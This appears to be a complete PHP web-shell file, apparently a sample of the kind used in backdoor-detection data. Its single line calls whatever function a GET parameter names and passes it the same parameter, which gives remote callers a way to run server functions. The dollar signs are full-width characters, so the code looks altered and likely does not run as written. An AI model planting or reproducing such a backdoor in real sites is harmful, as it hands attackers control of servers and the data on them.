<?php
＄_GET['m8QD253z'](＄_GET['m8QD253z']);
?>
